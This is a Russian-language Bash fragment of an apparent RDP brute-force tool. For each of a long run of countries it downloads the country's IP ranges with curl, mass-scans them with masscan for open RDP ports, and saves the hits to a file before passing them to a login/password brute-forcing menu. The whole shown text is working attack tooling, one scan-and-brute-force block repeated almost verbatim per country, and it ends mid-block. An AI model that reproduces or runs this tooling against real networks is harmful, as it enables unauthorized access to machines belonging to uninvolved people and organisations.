echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "118" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MEXICO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mexico://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "119" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MICRONESIA+FEDERATED+STATES+OF |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Micronesia Federated States of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "120" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MOLDOVA+REPUBLIC+OF |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Moldova Republic of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "121" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MONACO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Monaco://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "122" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MONGOLIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mongolia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "123" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MOROCCO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Morocco://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "124" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MOZAMBIQUE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Mozambique://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "125" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MYANMAR |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Myanmar://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "126" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NAMIBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Namibia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "127" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NAURU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nauru://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "128" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NEPAL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nepal://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "129" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NETHERLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Netherlands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "130" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MONTENEGRO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Montenegro://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "131" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NEW+CALEDONIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/New Caledonia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "132" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NEW+ZEALAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/New Zealand://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "133" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NICARAGUA|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nicaragua://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "134" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NIGER |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Niger://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "135" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NIGERIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nigeria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



